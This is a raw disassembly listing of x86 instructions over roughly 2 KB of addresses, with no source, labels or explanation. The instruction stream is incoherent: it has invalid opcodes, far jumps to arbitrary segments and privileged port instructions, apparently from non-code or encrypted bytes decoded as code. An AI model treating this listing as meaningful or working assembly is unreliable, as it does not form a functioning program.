  407e3e:	mov    ds:0x6ebe29c6,eax
  407e43:	popa   
  407e44:	leave  
  407e45:	pop    edx
  407e46:	(bad)  
  407e47:	xchg   ecx,eax
  407e48:	pop    ds
  407e49:	adc    edi,DWORD PTR [eax+esi*2+0xf038525]
  407e50:	outs   dx,BYTE PTR ds:[esi]
  407e51:	lods   al,BYTE PTR ds:[esi]
  407e52:	mov    edi,0x4925f6d4
  407e57:	mov    ecx,0x5b0c293f
  407e5c:	push   ebx
  407e5d:	scas   ax,WORD PTR es:[edi]
  407e5f:	ss jl  0x407e6b
  407e62:	shl    BYTE PTR [ecx],1
  407e64:	xor    DWORD PTR [ebx],ebp
  407e66:	popa   
  407e67:	pop    ebp
  407e68:	adc    DWORD PTR [eax-0x22],0x12
  407e6c:	or     cl,BYTE PTR [edi]
  407e6e:	arpl   WORD PTR ds:0xbf849b9b,bp
  407e74:	cmp    al,0x88
  407e76:	xchg   di,ax
  407e78:	ins    DWORD PTR es:[edi],dx
  407e79:	jecxz  0x407e2c
  407e7b:	pop    esp
  407e7c:	or     DWORD PTR [eax-0x58],esp
  407e7f:	(bad)  
  407e80:	sti    
  407e81:	hlt    
  407e82:	nop
  407e83:	loop   0x407e75
  407e85:	mov    al,0x0
  407e87:	imul   edi,DWORD PTR [eax+0x28ac9bb0],0x346cd6af
  407e91:	test   esp,edx
  407e93:	xchg   esi,eax
  407e94:	ss xchg edi,eax
  407e96:	jae    0x407ebf
  407e98:	push   eax
  407e99:	aas    
  407e9a:	out    dx,al
  407e9b:	xchg   ebp,eax
  407e9c:	sbb    eax,DWORD PTR [eax+0x186fbbd1]
  407ea2:	pop    ebx
  407ea3:	out    0x5f,eax
  407ea5:	sbb    eax,0x75868c3c
  407eaa:	imul   esp,DWORD PTR [edi],0xffffffa8
  407ead:	fldcw  WORD PTR [eax-0x67]
  407eb0:	not    BYTE PTR [eax-0x2e]
  407eb3:	retf   
  407eb4:	mov    dl,cl
  407eb6:	push   ds
  407eb7:	and    al,BYTE PTR [ecx]
  407eb9:	pop    ebp
  407eba:	fstp   DWORD PTR cs:[ebx]
  407ebd:	and    al,bh
  407ebf:	or     eax,0xc536f781
  407ec4:	mov    DWORD PTR [ecx+edx*4],ecx
  407ec7:	sbb    al,0x52
  407ec9:	addr16 cmp eax,0x9811b2ec
  407ecf:	xor    BYTE PTR [edx+0x57949c06],cl
  407ed5:	leave  
  407ed6:	popa   
  407ed7:	mov    bh,0x49
  407ed9:	mov    eax,ds:0x78d5e61
  407ede:	(bad)  
  407ee1:	(bad)  
  407ee2:	std    
  407ee3:	xor    BYTE PTR [ecx],al
  407ee5:	jecxz  0x407e72
  407ee7:	test   BYTE PTR [ebp-0x1d051d9d],0xfa
  407eee:	out    dx,al
  407eef:	push   edi
  407ef0:	push   DWORD PTR [ecx]
  407ef2:	mov    ds:0x1a341caf,al
  407ef7:	jmp    0x59ed:0xc22f43c5
  407efe:	xchg   edx,eax
  407eff:	ret    0x66fc
  407f02:	add    bl,BYTE PTR [eax]
  407f04:	loop   0x407e9d
  407f06:	cmp    edx,eax
  407f08:	and    eax,0xa0940681
  407f0d:	dec    eax
  407f0e:	shl    DWORD PTR [edx+0x58757c09],1
  407f14:	add    al,BYTE PTR [ebp+0x7b8baa72]
  407f1a:	add    dh,ah
  407f1c:	pop    ecx
  407f1d:	(bad)  
  407f1e:	retf   0x74e3
  407f21:	pop    ebp
  407f22:	sub    al,0xef
  407f24:	push   edi
  407f25:	add    DWORD PTR [edi-0x1e],eax
  407f28:	call   0x94cc:0x192576b3
  407f2f:	jmp    0x1af3:0xecdfbe5a
  407f36:	(bad)  
  407f37:	jns    0x407fad
  407f39:	mov    ecx,0xc6cfe34d
  407f3e:	inc    eax
  407f3f:	xor    dh,bl
  407f41:	add    DWORD PTR [ebp+edi*1+0x33d916a4],0x6d61141f
  407f4c:	jge    0x407f71
  407f4e:	mov    eax,0x89165c5
  407f53:	inc    edx
  407f54:	hlt    
  407f55:	in     al,dx
  407f56:	xchg   esi,eax
  407f57:	mov    ch,0xf3
  407f59:	or     BYTE PTR [ebx+0x76],0x79
  407f5d:	xor    ebx,DWORD PTR [ebx-0xd]
  407f60:	sbb    DWORD PTR [edi+ebx*8],ebx
  407f63:	ja     0x407fe3
  407f65:	inc    esi
  407f66:	(bad)  
  407f67:	or     DWORD PTR [ebx-0x186b3bef],eax
  407f6d:	xchg   edx,eax
  407f6e:	sahf   
  407f6f:	adc    ebp,DWORD PTR [ebx+0x6e]
  407f72:	clc    
  407f73:	out    0xbe,eax
  407f75:	ror    BYTE PTR [ebp+0x3dbea1b6],cl
  407f7b:	arpl   WORD PTR [edx-0x53],dx
  407f7e:	and    dh,BYTE PTR [ebx-0x5f46e194]
  407f84:	fld    QWORD PTR [ecx]
  407f86:	inc    edi
  407f87:	mov    al,ds:0x8ef23158
  407f8c:	sbb    edx,DWORD PTR [edx+0xf]
  407f8f:	push   0x666c23a9
  407f94:	jle    0x407f4f
  407f96:	inc    ebx
  407f97:	jae    0x407f36
  407f99:	test   BYTE PTR [edi+0x15],ah
  407f9c:	dec    edi
  407f9d:	lds    eax,FWORD PTR [edi+0x7]
  407fa0:	das    
  407fa1:	jmp    0x6c499899
  407fa6:	mov    WORD PTR [esi],es
  407fa8:	jno    0x407f72
  407faa:	repnz fucomi st,st(1)
  407fad:	jns    0x408003
  407faf:	pop    ds
  407fb0:	inc    eax
  407fb1:	test   eax,0x855f7e0e
  407fb6:	or     al,0x3d
  407fb8:	iret   
  407fb9:	mov    ds:0x7619f354,eax
  407fbe:	xchg   ebp,eax
  407fbf:	pop    edx
  407fc0:	cs pop edx
  407fc2:	ins    DWORD PTR es:[edi],dx
  407fc3:	pop    edi
  407fc4:	xchg   ecx,eax
  407fc5:	fisub  WORD PTR [edx-0xf]
  407fc8:	loope  0x407fe8
  407fca:	mov    cl,0xc2
  407fcc:	scas   eax,DWORD PTR es:[edi]
  407fcd:	or     edi,DWORD PTR [esi-0xc16e102]
  407fd3:	cld    
  407fd4:	enter  0x5eec,0xf9
  407fd8:	js     0x408037
  407fda:	cwde   
  407fdb:	pusha  
  407fdc:	dec    edi
  407fdd:	(bad)  
  407fde:	xchg   ebp,eax
  407fdf:	sbb    al,0xae
  407fe1:	push   esp
  407fe2:	outs   dx,BYTE PTR ds:[esi]
  407fe3:	push   eax
  407fe4:	in     al,dx
  407fe5:	retf   0xa201
  407fe8:	(bad)  
  407fe9:	ins    BYTE PTR es:[edi],dx
  407fea:	push   0xffffffbc
  407fec:	test   al,0x36
  407fee:	or     eax,0xa19aaa5a
  407ff3:	inc    eax
  407ff4:	loopne 0x407fef
  407ff6:	bound  edx,QWORD PTR [eax-0x1]
  407ff9:	jb     0x407ff6
  407ffb:	sbb    DWORD PTR [edi-0x6c],0xd9472576
  408002:	xchg   edi,eax
  408003:	aam    0x40
  408005:	adc    eax,0xe141cc2
  40800a:	std    
  40800b:	arpl   WORD PTR [edi],cx
  40800d:	stos   BYTE PTR es:[edi],al
  40800e:	pop    ebx
  40800f:	mov    ebp,0xd1cb22f0
  408014:	addr16 aas 
  408016:	arpl   WORD PTR [ebx+0xc],bx
  408019:	dec    eax
  40801a:	push   ds
  40801b:	outs   dx,BYTE PTR ds:[esi]
  40801c:	add    edx,DWORD PTR [ebx+0x7f]
  40801f:	xchg   ebp,eax
  408020:	aad    0x88
  408022:	push   ecx
  408023:	nop
  408024:	xchg   ecx,eax
  408025:	sar    BYTE PTR [esi+ebp*1],cl
  408028:	loop   0x407fb1
  40802a:	enter  0x7e39,0xf8
  40802e:	inc    esp
  40802f:	aaa    
  408030:	cs call 0xe7a7:0xf3dc7022
  408038:	inc    ecx
  408039:	fist   WORD PTR [edi+0x67]
  40803c:	push   ss
  40803d:	retf   
  40803e:	xor    DWORD PTR [ebx-0x7018e897],ebp
  408044:	imul   edx,DWORD PTR cs:[ecx-0x25],0x6b05dc0d
  40804c:	push   eax
  40804d:	jae    0x408028
  40804f:	or     al,0x60
  408051:	push   ebp
  408052:	push   0x280cd764
  408057:	adc    dh,bh
  408059:	push   0x1a
  40805b:	outs   dx,DWORD PTR ds:[esi]
  40805c:	mov    al,0xea
  40805e:	mulps  xmm6,XMMWORD PTR [ebp-0x62015f49]
  408065:	call   0x856737d5
  40806a:	std    
  40806b:	out    0xe8,al
  40806d:	call   0xe354:0x9b29a8a3
  408074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408075:	or     eax,0x2fc14d24
  40807a:	mov    esp,DWORD PTR [eax+ecx*2+0x70]
  40807e:	out    dx,al
  40807f:	xor    BYTE PTR [edx],al
  408081:	mov    edi,0xc8bd900a
  408086:	mov    WORD PTR [edi+0xf],?
  408089:	jg     0x40807d
  40808b:	out    dx,eax
  40808c:	and    eax,DWORD PTR [eax-0x7d]
  40808f:	shr    DWORD PTR [edi+0x5c86e9e0],1
  408095:	xchg   ecx,eax
  408096:	inc    esi
  408097:	adc    DWORD PTR [esi],ebp
  408099:	ins    DWORD PTR es:[edi],dx
  40809a:	fs push eax
  40809c:	xchg   DWORD PTR [ecx],ebp
  40809e:	mov    esi,0x20353c93
  4080a3:	mov    ecx,0x1a22ea73
  4080a8:	cld    
  4080a9:	xchg   ecx,eax
  4080aa:	xchg   edi,eax
  4080ab:	pop    ss
  4080ac:	hlt    
  4080ad:	dec    ecx
  4080ae:	push   0xd90bc8d6
  4080b3:	jmp    0x919dc7ff
  4080b8:	mov    dh,0x6
  4080ba:	das    
  4080bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080bc:	mov    dl,0xba
  4080be:	mov    al,0xb8
  4080c0:	nop
  4080c1:	sbb    eax,0xe311d2d1
  4080c6:	repz in eax,0x68
  4080c9:	jmp    0x408126
  4080cb:	jg     0x40807d
  4080cd:	sbb    dh,BYTE PTR [eax]
  4080cf:	adc    DWORD PTR [edi+0x34],eax
  4080d2:	mov    ds,WORD PTR [ecx+0x4]
  4080d5:	ds dec edi
  4080d7:	jnp    0x40807b
  4080d9:	cmp    ecx,DWORD PTR [esi]
  4080db:	jns    0x40814e
  4080dd:	mov    ebp,0x14786d91
  4080e2:	add    esp,DWORD PTR [esi+0x5fc251d1]
  4080e8:	push   edx
  4080e9:	cmp    BYTE PTR [esi],ah
  4080eb:	cmp    DWORD PTR [edx],esp
  4080ed:	sbb    bl,ch
  4080ef:	inc    edx
  4080f0:	push   ss
  4080f1:	pop    ds
  4080f2:	dec    esi
  4080f3:	add    eax,0xc909d436
  4080f8:	or     ebp,esi
  4080fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080fb:	pop    esp
  4080fc:	mov    ah,0xfa
  4080fe:	add    DWORD PTR [ecx-0x3e],eax
  408101:	sahf   
  408102:	in     al,0xa2
  408104:	push   edi
  408105:	scas   eax,DWORD PTR es:[edi]
  408106:	pop    edi
  408107:	sub    eax,0xad0aa91d
  40810c:	xor    eax,DWORD PTR [ebx-0x4f]
  40810f:	fwait
  408110:	rcr    BYTE PTR [edx-0x4c],cl
  408113:	adc    eax,0x5f51493a
  408118:	pop    es
  408119:	jne    0x40814c
  40811b:	test   al,0x9e
  40811d:	xor    dh,BYTE PTR [esp+eiz*8+0x3b387650]
  408124:	rcl    DWORD PTR [ecx+0x7721c59d],cl
  40812a:	aad    0xc5
  40812c:	cmp    al,0x21
  40812e:	push   ss
  40812f:	xchg   edi,eax
  408130:	loopne 0x40817e
  408132:	xor    eax,DWORD PTR [ebx-0x75a2465e]
  408138:	fdiv   st(7),st
  40813a:	cmc    
  40813b:	neg    DWORD PTR [ebp-0x3e4ffcfd]
  408141:	jg     0x408142
  408143:	inc    edx
  408144:	aad    0x5f
  408146:	xchg   esp,eax
  408147:	pop    esp
  408148:	xchg   ecx,eax
  408149:	in     eax,0xe8
  40814b:	retf   
  40814c:	jns    0x4081b3
  40814e:	jmp    0xd368b357
  408153:	aad    0xed
  408155:	mov    ecx,0xbdc670
  40815a:	pop    ecx
  40815b:	out    0x59,eax
  40815d:	xchg   BYTE PTR [edi-0x80],dl
  408160:	add    cl,BYTE PTR [ecx-0xf17a4b1]
  408166:	mov    ebp,0x18a32870
  40816b:	cmp    eax,0x90426b16
  408170:	sub    eax,DWORD PTR [eax+eax*1+0x29e6b64]
  408177:	repnz sub BYTE PTR [ebx],dl
  40817a:	xchg   esp,eax
  40817b:	and    DWORD PTR [edx+0x7d],edi
  40817e:	int    0xc7
  408180:	cdq    
  408181:	call   0xf582:0xa6f03759
  408188:	jo     0x4081c9
  40818a:	dec    ebx
  40818b:	jmp    0x91f067d6
  408190:	hlt    
  408191:	mov    ds:0x257f924,al
  408196:	cdq    
  408197:	lods   al,BYTE PTR ds:[esi]
  408198:	inc    esp
  408199:	xlat   BYTE PTR ds:[ebx]
  40819a:	mov    ecx,0x73f78d77
  40819f:	inc    edx
  4081a0:	cmc    
  4081a1:	pop    ecx
  4081a2:	mov    esp,0xf0653c0a
  4081a7:	adc    DWORD PTR [ebx+ecx*8-0xac182eb],eax
  4081ae:	push   0x67
  4081b0:	mov    al,ds:0x2d1324fe
  4081b5:	sbb    ecx,DWORD PTR [ebx+0x21]
  4081b8:	aam    0xc5
  4081ba:	xor    BYTE PTR [ebp-0x7d],bh
  4081bd:	mov    bl,ch
  4081bf:	icebp  
  4081c0:	pop    esi
  4081c1:	hlt    
  4081c2:	and    eax,0xcb2958bb
  4081c7:	xor    DWORD PTR [eax],eax
  4081c9:	dec    edi
  4081ca:	adc    esi,DWORD PTR ds:0x57ec7fad
  4081d0:	pop    ds
  4081d1:	scas   al,BYTE PTR es:[edi]
  4081d2:	and    eax,0x9b5def0a
  4081d7:	test   bl,ah
  4081d9:	mov    cl,0xe7
  4081db:	pop    edi
  4081dc:	lds    esi,FWORD PTR [edx-0x7b]
  4081df:	inc    ecx
  4081e0:	xor    ecx,ecx
  4081e2:	push   ss
  4081e3:	jae    0x408165
  4081e5:	cmp    DWORD PTR [ebx*8+0x638dca10],edx
  4081ec:	add    DWORD PTR [ebp+ebp*4-0x17],0x19
  4081f1:	ja     0x4081ee
  4081f3:	sub    al,al
  4081f5:	xchg   esi,eax
  4081f6:	shl    DWORD PTR [esi-0x3ca2e8af],cl
  4081fc:	and    bl,BYTE PTR [ebx]
  4081fe:	into   
  4081ff:	mov    ebx,0xc5422e29
  408204:	aas    
  408205:	mov    DWORD PTR [eax+0x3a],esp
  408208:	adc    DWORD PTR [esi-0x3c76f0fe],eax
  40820e:	je     0x4081ef
  408210:	xchg   ebx,eax
  408211:	mov    edi,0xdb4c7db5
  408216:	out    dx,eax
  408217:	mov    dh,0x7e
  408219:	fisttp QWORD PTR [edi]
  40821b:	sbb    bl,bl
  40821d:	xlat   BYTE PTR ds:[ebx]
  40821e:	sbb    eax,0x16a6202a
  408223:	enter  0xfb32,0x6d
  408227:	bound  edx,QWORD PTR [eax+0x3b]
  40822a:	xadd   DWORD PTR [esi],ebx
  40822d:	jl     0x4081b0
  40822f:	cwde   
  408230:	cmp    DWORD PTR [eax-0x36],edx
  408233:	add    eax,0x7509d59a
  408238:	lds    eax,FWORD PTR gs:[esp+eax*4-0x5ff810dc]
  408240:	xor    BYTE PTR [eax+eiz*2+0x67911c41],dh
  408247:	jp     0x408267
  408249:	(bad)  [ecx]
  40824b:	push   0xffffffb1
  40824d:	pop    ss
  40824e:	mov    ebx,DWORD PTR [edi-0x6c7dcbde]
  408254:	sahf   
  408255:	fs stos DWORD PTR es:[edi],eax
  408257:	fimul  WORD PTR ds:0xff77d0dd
  40825d:	neg    BYTE PTR [edi-0x7c588a3]
  408263:	ins    DWORD PTR es:[edi],dx
  408264:	mov    DWORD PTR [esp+edx*1],edi
  408267:	adc    al,0x66
  408269:	mov    BYTE PTR ds:0x49e27192,cl
  40826f:	jmp    0x408223
  408271:	or     bl,bh
  408273:	sub    esp,DWORD PTR [edx]
  408275:	(bad)  
  408277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408278:	mov    WORD PTR [ebp-0x470f262d],?
  40827e:	retf   
  40827f:	push   ds
  408280:	repz (bad) 
  408282:	jmp    0x33c0d55f
  408287:	cwde   
  408288:	jns    0x4082e9
  40828a:	jo     0x4082d8
  40828c:	rol    DWORD PTR [eax],0x8c
  40828f:	clc    
  408290:	aam    0xe4
  408292:	cmp    al,0x82
  408294:	or     eax,0xd653bdba
  408299:	repz rcr ebp,1
  40829c:	add    ch,BYTE PTR [eax-0x47]
  40829f:	jmp    0x40823c
  4082a1:	push   ebx
  4082a2:	sbb    cl,BYTE PTR [edx+0x20]
  4082a5:	inc    ebp
  4082a6:	fild   DWORD PTR [ebx+0x17]
  4082a9:	cli    
  4082aa:	mov    ecx,esi
  4082ac:	dec    esi
  4082ad:	push   eax
  4082ae:	inc    ebp
  4082af:	inc    edi
  4082b0:	aaa    
  4082b1:	jmp    0x8d06ae46
  4082b6:	inc    ebx
  4082b7:	and    eax,0x979ea83e
  4082bc:	mov    cl,0x11
  4082be:	(bad)  
  4082c0:	mov    ds:0x9e6e9c66,eax
  4082c5:	pop    edi
  4082c6:	push   0xfffffff7
  4082c8:	adc    DWORD PTR [ecx+0x5f6732dc],edx
  4082ce:	jb     0x40833d
  4082d0:	cmp    DWORD PTR [ecx+eiz*1-0x58],ecx
  4082d4:	push   0x4940e0ff
  4082d9:	or     DWORD PTR [edx-0x7fb6e029],esi
  4082df:	scas   al,BYTE PTR es:[edi]
  4082e0:	sub    ch,BYTE PTR [edi-0x5a]
  4082e3:	sbb    DWORD PTR [eax],esi
  4082e5:	or     DWORD PTR [ebx+eax*1+0x43],esi
  4082e9:	pop    edx
  4082ea:	mov    fs,WORD PTR [ecx-0x79]
  4082ed:	repz xchg ecx,eax
  4082ef:	mov    ebx,0x95b47fdc
  4082f4:	dec    edx
  4082f5:	icebp  
  4082f6:	aaa    
  4082f7:	jns    0x40836b
  4082f9:	scas   eax,DWORD PTR es:[edi]
  4082fa:	dec    eax
  4082fb:	jne    0x4082d8
  4082fd:	push   esp
  4082fe:	sbb    BYTE PTR [ebx+0x7b0fa856],bh
  408304:	mov    ?,WORD PTR ds:0x8f9ef6bb
  40830a:	rcl    ah,1
  40830c:	(bad)  
  40830d:	push   esp
  40830e:	fst    DWORD PTR [edx-0x7e62772a]
  408314:	fcmovnb st,st(5)
  408316:	aaa    
  408317:	repz mov cs,WORD PTR [ecx-0x44]
  40831b:	push   esp
  40831c:	ret    
  40831d:	gs call 0xba4e:0xda4d53cd
  408325:	pushf  
  408326:	xor    DWORD PTR [edx+0x4f],0x124f778a
  40832d:	in     eax,0xb2
  40832f:	fimul  DWORD PTR [eax]
  408331:	inc    eax
  408332:	sub    BYTE PTR [ebx-0x46],0x54
  408336:	test   eax,0xaf1d2b7c
  40833b:	sahf   
  40833c:	jbe    0x40832c
  40833e:	pop    ecx
  40833f:	dec    ebx
  408340:	retf   
  408341:	add    BYTE PTR [bp+di],0x37
  408345:	dec    ebp
  408346:	js     0x4083bb
  408348:	js     0x408304
  40834a:	lods   al,BYTE PTR ds:[esi]
  40834b:	pop    ebx
  40834c:	test   DWORD PTR [edx-0x67964315],ebp
  408352:	inc    ecx
  408353:	xchg   ebp,eax
  408354:	loopne 0x40833a
  408356:	pop    edi
  408357:	sbb    ch,BYTE PTR ds:0x7c735bd6
  40835d:	cmp    dl,bl
  40835f:	loope  0x4083b7
  408361:	mov    esp,0xa6c0ed7e
  408366:	fcomp  st(7)
  408368:	mov    cl,0x3d
  40836a:	mov    bl,0x5c
  40836c:	fsub   DWORD PTR [edi]
  40836e:	inc    eax
  40836f:	or     eax,0xb96e1b93
  408374:	les    ecx,FWORD PTR [ecx+0x3e]
  408377:	inc    ebp
  408378:	mov    ecx,0x460c8efd
  40837d:	push   ecx
  40837e:	pop    esp
  40837f:	adc    dl,BYTE PTR [eax]
  408381:	xor    al,0x7
  408383:	cdq    
  408384:	pop    ecx
  408385:	je     0x40830c
  408387:	shr    ebp,cl
  408389:	inc    ecx
  40838a:	call   0x55d3:0x9f6e8708
  408391:	mov    ch,0x3b
  408393:	mov    BYTE PTR [eax+0x5f6a4d6d],ah
  408399:	mov    ebp,0xfbee4531
  40839e:	mov    edi,0x3f57307b
  4083a3:	enter  0x34e,0x32
  4083a7:	adc    esp,edi
  4083a9:	or     eax,0xda3d4bbe
  4083ae:	jg     0x408426
  4083b0:	je     0x40834a
  4083b2:	jmp    0x907:0xfa72f39
  4083b9:	pop    es
  4083ba:	es call 0xd00e:0x3e260d85
  4083c2:	mov    esi,esp
  4083c4:	jge    0x4083a4
  4083c6:	inc    eax
  4083c7:	sar    ebp,cl
  4083c9:	cmp    eax,0xa3618e84
  4083ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083cf:	mov    edi,0x378cf128
  4083d4:	scas   al,BYTE PTR es:[edi]
  4083d5:	lods   al,BYTE PTR ds:[esi]
  4083d6:	cld    
  4083d7:	aaa    
  4083d8:	adc    al,0x47
  4083da:	lods   eax,DWORD PTR ds:[esi]
  4083db:	in     eax,0xdd
  4083dd:	ins    DWORD PTR es:[edi],dx
  4083de:	div    BYTE PTR [ebx+0x32fbd337]
  4083e4:	les    ebx,FWORD PTR [ebx-0x4734f812]
  4083ea:	jae    0x4083af
  4083ec:	push   edi
  4083ed:	mov    edi,0xf6b406dd
  4083f2:	push   ds
  4083f3:	ins    DWORD PTR es:[edi],dx
  4083f4:	test   DWORD PTR [ebp-0x615d6636],esp
  4083fa:	inc    ecx
  4083fb:	push   esi
  4083fc:	xchg   edi,eax
  4083fd:	fimul  WORD PTR [ebp-0x36a6aa49]
  408403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408404:	(bad)  
  408405:	enter  0xf65f,0xca
  408409:	jl     0x408480
  40840b:	aaa    
  40840c:	push   esi
  40840d:	js     0x408393
  40840f:	add    DWORD PTR [edi+edi*8],ebp
  408412:	inc    edi
  408413:	mov    dl,0x60
  408415:	call   0xc964:0x8a879bed
  40841c:	jbe    0x4083a3
  40841e:	or     DWORD PTR [edx-0x356b50c7],edi
  408424:	leave  
  408425:	dec    edx
  408426:	inc    ebx
  408427:	addr16 in al,dx
  408429:	xchg   ebp,eax
  40842a:	(bad)  
  40842b:	std    
  40842c:	inc    ebx
  40842d:	(bad)  
  40842e:	mov    ah,0xb4
  408430:	push   ecx
  408431:	xor    cl,BYTE PTR [edi+ebp*2]
  408434:	xor    ebp,esi
  408436:	push   esp
  408437:	jmp    0xa6380c87
  40843c:	ja     0x408429
  40843e:	icebp  
  40843f:	daa    
  408440:	int    0x7d
  408442:	push   eax
  408443:	jecxz  0x408436
  408445:	dec    eax
  408446:	push   ebp
  408447:	dec    edx
  408448:	pop    ecx
  408449:	icebp  
  40844a:	daa    
  40844b:	stos   BYTE PTR es:[edi],al
  40844c:	xor    DWORD PTR [esi+eax*1-0x4362b8ad],0xf0e62780
  408457:	fdivr  st(0),st
  408459:	sub    cl,ah
  40845b:	dec    edi
  40845c:	mov    edi,0x33e914c5
  408461:	popf   
  408462:	mov    ch,0xde
  408464:	dec    esp
  408465:	int3   
  408466:	adc    BYTE PTR [edx-0x2224c442],0x7b
  40846d:	in     eax,dx
  40846e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40846f:	lahf   
  408470:	mov    DWORD PTR [esi-0x1b5d098f],edi
  408476:	int3   
  408477:	xor    BYTE PTR [edx+ecx*4],bh
  40847a:	cdq    
  40847b:	jbe    0x4084d4
  40847d:	sub    DWORD PTR [eax+0x2893f4a5],eax
  408483:	fadd   st,st(6)
  408485:	cmp    ebx,DWORD PTR [edi-0x49a1c6e]
  40848b:	cdq    
  40848c:	pop    es
  40848d:	dec    ecx
  40848e:	cdq    
  40848f:	xchg   esi,eax
  408490:	mov    al,0x5f
  408492:	or     eax,0xa44f8309
  408497:	xor    eax,ebx
  408499:	data16 jecxz 0x4084f8
  40849c:	dec    ecx
  40849d:	retf   
  40849e:	enter  0x15f8,0x10
  4084a2:	aas    
  4084a3:	in     eax,0xbf
  4084a5:	dec    ecx
  4084a6:	jno    0x408461
  4084a8:	xor    eax,0x5628d080
  4084ad:	ins    DWORD PTR es:[edi],dx
  4084ae:	in     al,0x28
  4084b0:	mov    ?,WORD PTR [ebx-0x7e2df5c3]
  4084b6:	mov    edi,0x8ba7a725
  4084bb:	push   bp
  4084bd:	jg     0x408463
  4084bf:	push   esi
  4084c0:	pop    es
  4084c1:	jge    0x4084f6
  4084c3:	mov    esp,0x2306a773
  4084c8:	sbb    al,BYTE PTR [esi-0x27]
  4084cb:	push   eax
  4084cc:	cmp    ebx,DWORD PTR [ebp+0x1474aa7c]
  4084d2:	loop   0x408468
  4084d4:	lea    ebp,[esp+eiz*4+0x423d01b8]
  4084db:	jmp    0x372f7d44
  4084e0:	sub    al,0xb4
  4084e2:	mov    eax,0xa8df84c8
  4084e7:	pusha  
  4084e8:	stos   DWORD PTR es:[edi],eax
  4084e9:	mov    ds:0x1b815952,eax
  4084ee:	shr    DWORD PTR [edx-0x1e],0xc
  4084f2:	add    eax,0x9ebe3310
  4084f7:	sar    ecx,1
  4084f9:	shl    DWORD PTR [ecx+0x53],cl
  4084fc:	inc    DWORD PTR [esi+0x7]
  4084ff:	push   es
  408500:	push   ebp
  408501:	sub    BYTE PTR [bx+si],0xe5
  408505:	repz push edx
  408507:	pop    ebp
  408508:	add    ch,cl
  40850a:	(bad)  [esi]
  40850c:	inc    esi
  40850d:	nop
  40850e:	cmp    DWORD PTR [eax],0xffffff85
  408511:	xchg   DWORD PTR [ecx-0x347ab751],edx
  408517:	sub    al,ah
  408519:	mov    dl,0xd
  40851b:	xchg   edi,eax
  40851c:	sar    BYTE PTR [ebp-0x58653e6],0x28
  408523:	outs   dx,BYTE PTR ds:[esi]
  408524:	ss xchg esi,eax
  408526:	push   ds
  408527:	cld    
  408528:	push   esi
  408529:	pop    ebx
  40852a:	imul   ebp,DWORD PTR [edi+0x7c991c7a],0xcdb728fd
  408534:	and    eax,ebx
  408536:	je     0x408558
  408538:	xchg   esi,eax
  408539:	fild   DWORD PTR ss:[ecx+0xc]
  40853d:	aas    
  40853e:	mov    al,ds:0x26afb6ab
  408544:	mov    al,0xdd
  408546:	idiv   DWORD PTR [ebp+0x3aca1e7f]
  40854c:	sahf   
  40854d:	(bad)  
  40854e:	icebp  
  40854f:	jne    0x4084d4
  408551:	push   edx
  408552:	jmp    0x2eea1a0b
  408557:	sbb    al,0x4
  408559:	lods   eax,DWORD PTR ds:[esi]
  40855a:	fs (bad) 
  40855c:	mov    edx,0xe7f9f1b7
  408561:	sbb    BYTE PTR [edx],dl
  408563:	ret    0xfe92
  408566:	loop   0x408508
  408568:	sti    
  408569:	xchg   edx,eax
  40856a:	push   esp
  40856b:	std    
  40856c:	mov    esi,0x1d9d8f7
  408571:	xchg   esi,eax
  408572:	outs   dx,DWORD PTR ds:[esi]
  408573:	fnstsw WORD PTR [ebp-0x65]
  408576:	jmp    0x1406194
  40857b:	inc    ebp
  40857c:	lahf   
  40857d:	imul   edx,DWORD PTR [ecx],0xea38ca0
  408583:	cmp    esi,DWORD PTR [eax-0x36]
  408586:	mov    edi,edx
  408588:	jnp    0x40853b
  40858a:	mov    dh,0xab
  40858c:	cmp    ebx,DWORD PTR es:0xc70058cb
  408593:	mov    si,0x5c56
  408597:	xor    DWORD PTR [edi-0x163beb52],0xa7a8eb79
  4085a1:	scas   al,BYTE PTR es:[edi]
  4085a2:	jb     0x408614
  4085a4:	push   es
  4085a5:	outs   dx,DWORD PTR ds:[esi]
  4085a6:	adc    ecx,eax
  4085a8:	lock push ss
  4085aa:	loopne 0x408570
  4085ac:	mov    edx,DWORD PTR [edx-0x43ee740b]
  4085b2:	adc    DWORD PTR [edx],ebp
  4085b4:	retf   
  4085b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085b6:	test   eax,0x72d830e5
  4085bb:	sub    eax,0x8f6619c6
  4085c0:	mov    ch,0x7a
  4085c2:	adc    BYTE PTR [edx],bh
  4085c4:	cmp    ebx,DWORD PTR [edx-0x1cbe7f0c]
  4085ca:	lock mov esi,DWORD PTR [edi-0x407ed81c]
  4085d1:	xor    eax,0x8bdb7032
  4085d6:	scas   eax,DWORD PTR es:[edi]
  4085d7:	(bad)  
  4085d8:	ret    
  4085d9:	sbb    DWORD PTR [edx+0x29e7fb34],edx
  4085df:	fild   WORD PTR [eax-0x4b]
  4085e2:	fst    DWORD PTR [ebx+0x4765f564]
  4085e8:	pop    ebx
  4085e9:	rcl    BYTE PTR [ecx],1
  4085eb:	push   cs
  4085ec:	enter  0x9d56,0xdf
  4085f0:	sahf   
  4085f1:	adc    BYTE PTR [ebx],dl
  4085f3:	into   
  4085f4:	push   esi
  4085f5:	test   ch,bl
  4085f7:	sub    eax,0xaf2b848a
  4085fc:	sbb    esp,DWORD PTR [ecx-0x14bddde5]
  408602:	fwait
  408603:	ja     0x40860c
  408605:	mov    ds:0xe854f0cc,al
  40860a:	pop    ebp
  40860b:	pop    edi
  40860c:	inc    ebp
  40860d:	shl    DWORD PTR ds:0xe2432e74,0x9
  408614:	in     al,0x5d
  408616:	das    
  408617:	push   esi
  408618:	test   BYTE PTR [edi+0x7f],bl
  40861b:	xchg   edx,eax
  40861c:	or     bh,al
  40861e:	push   ebp
  40861f:	sub    al,0x1a
  408621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408622:	repnz mov edx,DWORD PTR [ecx]
  408625:	pusha  
  408626:	dec    ebp
  408627:	add    eax,0x9b948aa7
  40862c:	es (bad) 
  40862e:	cmp    DWORD PTR [esi-0x1f],ecx
  408631:	jecxz  0x40867f
  408633:	add    DWORD PTR [edx-0x307c704f],esi
  408639:	cmp    dl,al
